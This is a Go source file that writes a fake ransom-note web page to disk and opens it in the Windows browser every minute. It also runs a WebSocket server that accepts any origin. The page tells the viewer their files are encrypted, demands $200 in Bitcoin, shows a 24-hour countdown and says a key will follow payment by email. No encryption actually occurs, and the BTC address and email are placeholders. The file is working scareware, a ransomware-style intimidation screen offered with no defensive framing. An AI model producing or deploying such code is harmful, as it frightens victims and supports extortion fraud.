package html

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func writeHTMLToFile(localFilePath, htmlContent string) error {
	// Create a file on the local system to save the HTML content
	file, err := os.Create(localFilePath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Write the HTML content to the file
	_, err = file.WriteString(htmlContent)
	if err != nil {
		return err
	}

	return nil
}

func openHTMLFileInBrowser(localFilePath string) error {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// On Windows, use "start" to open the file with the default application
		cmd = exec.Command("cmd", "/c", "start", localFilePath)
	} else {
		return fmt.Errorf("Opening files in the default browser is not supported on this operating system.")
	}

	return cmd.Run()
}

func handleConnection(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	// Monitor if the user closes the browser
	go func() {
		for {
			_, _, err := conn.ReadMessage()
			if err != nil {
				// The user closed the browser, so you can take action here.
				fmt.Println("User closed the browser.")
				break
			}
		}
	}()
}

func Html() {
	// Specify the local file path where you want to save your HTML code
	localFilePath := "my_html.html" // Replace with the desired path

	// Write your HTML code to the local file
	htmlContent := `
	<!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Love or Hate</title>
		<style>
			body {
				background-color: black;
				color: white;
				font-family: Arial, sans-serif;
				display: flex;
				flex-direction: column;
				justify-content: center;
				align-items: center;
				height: 100vh;
				margin: 0;
			}
	
			.countdown-box {
				font-size: 24px;
			}
	
			.box {
				width: 300px;
				padding: 20px;
				background-color: rgba(0, 0, 0, 0.5);
				border-radius: 10px;
				text-align: center;
			}
	
			.container {
				display: flex;
				justify-content: center;
				align-items: center;
			}
	
			.hacked-text {
				text-align: center;
				margin-top: 20px;
				font-size: 20px; /* Increased font size */
				display: inline-block;
			}
	
			.button-flex {
				display: flex;
				gap: 20px; /* Add some space between buttons */
			}
	
			.button-flex button {
				cursor: pointer;
				color: blue;
				display: none; /* Initially hide the buttons */
			}
	
			.border-hidden {
				display: none;
			}
	
			.border-visible {
				display: block;
				padding: 10px;
				border: 2px solid white;
				border-radius: 5px;
				margin: 10px 0;
			}
		</style>
	</head>
	<body>
		<div class="countdown-box" id="countdown" style="display: none;">24:00:00</div>
	
		<div class="box">
			<div class="container">
				<div id="messageDiv">
					<h1 id="message">I love you</h1>
				</div>
			</div>
		</div>
	
		<div class="hacked-text">
			<p><span id="text1"></span></p>
			<p><span id="text2"></span></p>
			<p><span id="text3"></span></p>
		</div>
	
		<div class="button-flex">
			<button id="toggle-btc-border" style="display: none;">Show BTC Address</button>
			<button id="toggle-email-border" style="display: none;">Show Email Address</button>
			<button id="message-button" style="display: none;">Show Message</button>
		</div>
	
		<div id="btc-border" class="border-hidden">
			<p>BTC Address: 1234567890</p>
		</div>
	
		<div id="email-border" class="border-hidden">
			<p>Email: example@example.com</p>
		</div>
	
		<script>
			var btcBorder = document.getElementById("btc-border");
			var emailBorder = document.getElementById("email-border");
			var toggleBtcButton = document.getElementById("toggle-btc-border");
			var toggleEmailButton = document.getElementById("toggle-email-border");
			var messageButton = document.getElementById("message-button");
			var countdown = document.getElementById("countdown");
			var countdownTime = 24 * 60 * 60; // 24 hours in seconds
			var countdownInterval;
	
			function startCountdown() {
				countdown.style.display = "block";
				countdownInterval = setInterval(function () {
					countdownTime--;
					var hours = Math.floor(countdownTime / 3600);
					var minutes = Math.floor((countdownTime % 3600) / 60);
					var seconds = countdownTime % 60;
					countdown.textContent = hours + ':' + minutes + ':' + seconds;
					if (countdownTime <= 0) {
						clearInterval(countdownInterval);
						countdown.textContent = "Time's up!";
					}
				}, 1000);
			}
	
			toggleBtcButton.addEventListener("click", function () {
				btcBorder.classList.toggle("border-visible");
			});
	
			toggleEmailButton.addEventListener("click", function () {
				emailBorder.classList.toggle("border-visible");
			});
	
			messageButton.addEventListener("click", function () {
				alert("After paying, send me an email using my Gmail saying 'paid' and you will receive your key.");
			});
	
			// Enable buttons after a delay of 45 seconds
			setTimeout(function () {
				toggleBtcButton.style.display = "block";
				toggleEmailButton.style.display = "block";
				messageButton.style.display = "block";
			}, 49000); // 45000 milliseconds (45 seconds)
	
			// Start the countdown after a 50-second delay
			setTimeout(function () {
				startCountdown();
			}, 50000); // 50000 milliseconds (50 seconds)
	
			// Function to change the message after 5 seconds
			setTimeout(function () {
				var messageDiv = document.getElementById("messageDiv");
				var message = document.getElementById("message");
				message.textContent = "I hate you";
				messageDiv.style.color = "red";
	
				// Trigger the "hacked-text" animation for the first two lines
				var text1 = "You have been hacked by nobody";
				var text2 = "and all your files have been encrypted";
				var text3 = "To decrypt your files, you must pay $200.";
				var index1 = 0;
				var index2 = 0;
				var index3 = 0;
				var target1 = document.getElementById("text1");
				var target2 = document.getElementById("text2");
				var target3 = document.getElementById("text3");
				var interval = 400; // 400 milliseconds
	
				function displayText1() {
					if (index1 < text1.length) {
						target1.innerHTML += text1[index1];
						index1++;
						setTimeout(displayText1, interval);
					}
				}
	
				function displayText2() {
					if (index2 < text2.length) {
						target2.innerHTML += text2[index2];
						index2++;
						setTimeout(displayText2, interval);
					}
				}
	
				function displayText3() {
					if (index3 < text3.length) {
						target3.innerHTML += text3[index3];
						index3++;
						setTimeout(displayText3, interval);
					} else {
						// Display the borders and the message button after text is shown
						toggleBtcButton.style.display = "block";
						toggleEmailButton.style.display = "block";
						messageButton.style.display = "block";
					}
				}
	
				setTimeout(displayText1, interval);
				setTimeout(displayText2, text1.length * interval);
				setTimeout(displayText3, (text1.length + text2.length) * interval);
			}, 5000); // 5000 milliseconds (5 seconds)
		</script>
	</body>
	</html>
	
	`

	err := writeHTMLToFile(localFilePath, htmlContent)
	if err != nil {
		fmt.Printf("Error writing the HTML file: %v\n", err)
		return
	}

	fmt.Printf("HTML code saved to %s\n", localFilePath)

	// Start a WebSocket server
	http.HandleFunc("/ws", handleConnection)
	go func() {
		err := http.ListenAndServe(":8081", nil)
		if err != nil {
			fmt.Printf("Error starting WebSocket server: %v\n", err)
		}
	}()

	// Open the HTML file in the default web browser every 5 seconds
	ticker := time.NewTicker(1 * time.Minute)
	go func() {
		for range ticker.C {
			err := openHTMLFileInBrowser(localFilePath)
			if err != nil {
				fmt.Printf("Error opening the file: %v\n", err)
			}
		}
	}()

	// Keep the program running
	select {}
}
